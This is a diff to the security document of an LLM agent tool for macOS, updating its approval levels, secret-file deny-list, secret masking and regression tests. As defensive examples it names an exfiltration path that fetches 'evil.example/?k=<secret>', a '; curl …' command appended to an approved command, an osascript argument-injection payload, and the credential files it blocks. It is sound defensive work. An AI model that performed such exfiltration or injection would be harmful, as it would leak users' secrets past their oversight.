@@ -6,7 +6,7 @@ iAgent runs an LLM that can read files, run commands and act on your Apple devic
 - the controls that do it, mapped to the standards they come from,
 - the risks that remain.
 
-The last review was on 2026-10-09 against v0.2.0 plus secret masking and local-only mode. Every control below has a regression test that tries to break it, listed under "How it was verified".
+The last review was on 2026-10-11 against v0.2.0 plus secret masking, local-only mode and the approval-scope fixes below. Every control below has a regression test that tries to break it, listed under "How it was verified".
 
 ## Threat model
 
@@ -26,21 +26,22 @@ The last review was on 2026-10-09 against v0.2.0 plus secret masking and local-o
 
 | Level | Applies to | `--yolo` | "always" |
 |---|---|---|---|
-| none | Read-only, inside the project: read/glob/grep in the working dir, device scans, listing reminders/events, battery | – | – |
-| ask | Changes: writes in the project, reminders/calendar/notes edits, installs, shortcuts, AppleScript | skips | per tool action |
-| ask, scoped | `bash` (scoped to the exact command), `web_fetch` (scoped to the host), file access outside the working dir | skips | that exact scope only |
-| sensitive | Secret/credential files (read or write), shell-startup and LaunchAgent files, sending messages | **still asks** | not offered |
+| none | Read-only, inside the project: read/glob/grep in the working dir, device scans, listing reminders/events/simulators, battery | – | – |
+| ask | Changes: writes in the project, reminders/calendar/notes edits, installs, every simulator and device action except listing | skips | per tool action |
+| ask, scoped | `bash` (the exact, complete command), `applescript` (the exact script and arguments), `mac open` (the exact target and app), `shortcuts run` (one shortcut), `web_fetch` (one host), `simulator openurl` (one URL), file access outside the working dir (one directory) | skips | that exact scope only |
+| sensitive | Secret/credential files (read or write), files that run code later (shell startup and login files, LaunchAgents, `.git/hooks`, `.git/config`, `~/.gitconfig`, `~/.config/git`, `~/.config/fish`) when written, sending messages | **still asks** | not offered |
 
 - Non-interactive runs refuse anything that isn't "none" unless you pass `--yolo`. "Sensitive" calls are refused in non-interactive runs, with or without `--yolo`.
-- Each approval prompt shows exactly what will run: the full command, the diff (up to 40 lines each side, with a count of the rest), or the message recipient and text.
+- Each approval prompt shows exactly what will run: the full command or script, the diff (up to 40 lines each side, with a count of the rest; an overwrite shows only the lines it changes), the message recipient and text, or, for other tools, every argument of the call.
+- A path given to any tool (device copies, screenshots, shortcut input, app installs) follows the same rules as `read_file`/`write_file`, so a secret file can't reach the model through a side door and a screenshot can't overwrite a shell startup file.
 
 ### Data exfiltration and secrets (OWASP LLM02, CWE-200/312/522/732)
 
-- **Secret files are never sent to a cloud model.** Reads of `.env*`, `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, Keychains, `*.pem/*.key/*.p12`, `.netrc`, `.git-credentials`, `~/.iagent`, and similar are blocked outright (approval level `blocked`, which neither the user nor `--yolo` can override). In local-only mode they can be read after confirming each time. Writing them always needs confirmation.
+- **Secret files are never sent to a cloud model.** Reads of `.env*`, `.envrc`, `~/.ssh`, `~/.config/gh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, Keychains, `*.pem/*.key/*.p12`, `.netrc`, `.git-credentials`, `~/.iagent`, and similar are blocked outright (approval level `blocked`, which neither the user nor `--yolo` can override). In local-only mode they can be read after confirming each time. Writing them always needs confirmation.
 - **Secrets are masked before anything reaches the model** (`Redact`). This covers the user's messages, every tool result and error, and the project instruction files in the system prompt. Masked items: well-known token formats (Anthropic, OpenAI, GitHub, GitLab, Slack, AWS, Google, Stripe, npm, Hugging Face, JWT), private key blocks, URL passwords, `Bearer`/`Basic` tokens, `password=`/`token:`-style values containing letters and digits, the resolved API key, and the value of every environment variable whose name contains KEY, TOKEN, SECRET, PASSWORD, CREDENTIAL or AUTH. The user sees a "masked N secrets" notice each time.
 - **Symlinks are resolved first.** So `innocent.txt -> ~/.ssh/id_rsa` is caught.
 - **`grep` never opens secret files.** It tells the model how many it skipped.
-- **`web_fetch` asks per host.** This closes the "read a secret, then fetch `evil.example/?k=<secret>`" path.
+- **`web_fetch` asks per host.** This closes the "read a secret, then fetch `evil.example/?k=<secret>`" path. The other ways to reach a URL ask too: `mac open` per exact target and `simulator openurl` per exact URL.
 - **API keys are removed from child processes.** `bash`, `osascript` and every helper run without `*_API_KEY` in their environment, including any custom `apiKeyEnv`.
 - **Keys can live in the macOS Keychain** (`apiKeyKeychain`). A config file containing `apiKey` that other users can read triggers a startup warning.
 - **Nothing is written to disk.** No transcript, cookie or cache is stored (sessions are ephemeral). Temporary files are deleted immediately.
@@ -102,8 +103,9 @@ In this mode, no data leaves the machine:
 3. **The model provider sees everything the model reads, apart from masked secrets.** Masking is pattern-based (a deny-list). A password with no digits, or a secret in an unusual format, can get through. Use `--local` for confidential work.
 4. **macOS grants privacy permissions to your terminal app** when it launches iAgent. Other tools run from that terminal share those grants.
 5. **No App Sandbox.** It's incompatible with a developer agent that must run arbitrary tools.
-6. **The secret-file list is a deny-list.** Unusual secret locations aren't recognized. The approval prompt for reading outside the project still applies to them.
-7. **Local-only mode protects against data leaving the machine, but it can't stop everything.** An approved `bash` command can still change local files, and XPC services that the sandbox doesn't name could in principle make network requests on its behalf. `sandbox-exec` is deprecated by Apple, though still shipped and enforced. Ordinary tool calls in local mode (reading reminders, contacts or notes) keep their data on the Mac, because the model is local too.
+6. **A new file longer than 40 lines is not shown in full** in the approval prompt; the prompt says how many lines it left out. Read large files after they are written, or deny and ask for smaller pieces.
+7. **The secret-file list is a deny-list.** Unusual secret locations aren't recognized. The approval prompt for reading outside the project still applies to them.
+8. **Local-only mode protects against data leaving the machine, but it can't stop everything.** An approved `bash` command can still change local files, and XPC services that the sandbox doesn't name could in principle make network requests on its behalf. `sandbox-exec` is deprecated by Apple, though still shipped and enforced. Ordinary tool calls in local mode (reading reminders, contacts or notes) keep their data on the Mac, because the model is local too.
 
 ## Reporting a vulnerability
 
@@ -113,10 +115,13 @@ Please report privately to the maintainer rather than opening a public issue. In
 
 Each control was tested with harmless payloads on macOS 26.7. These probes are automated in `Tests/iAgentTests/SecurityTests.swift`; run them with `swift test < /dev/null`.
 
-- **Escape codes:** ESC/OSC sequences in a file were shown as visible markers.
+- **Escape codes:** ESC/OSC sequences in a file were shown as visible markers, and so was an OSC sequence in a refused path.
 - **Hidden commands:** a `\r`-hidden bash command was visible in the prompt.
 - **Secret files:** `~/.ssh` and `.env` reads were refused even with `--yolo`, including through a symlink. `grep` skipped secret files.
-- **Exfiltration:** `web_fetch` required approval.
+- **Exfiltration:** `web_fetch` required approval. `simulator openurl` and `mac open` were scoped to one exact URL, and `shortcuts run` with a secret `input_path` and `ios_device copy_to` from `~/.ssh` were blocked.
+- **Approval scopes:** "always" for a 300-character command didn't cover the same command with `; curl …` appended. Different AppleScripts, outside directories and URLs got different scopes.
+- **Code that runs later:** writes to `.git/hooks/pre-commit`, `.git/config`, `~/.gitconfig`, `~/.zlogin` and fish config asked every time; reading `.git/config` did not.
+- **Prompts:** a tool without its own preview listed every argument (a shortcut's `input_path`), and an overwrite showed only the changed line.
 - **Argument injection:**
   - A `say -o` value didn't create the file.
   - An osascript argument `-e <payload>` arrived as plain data.
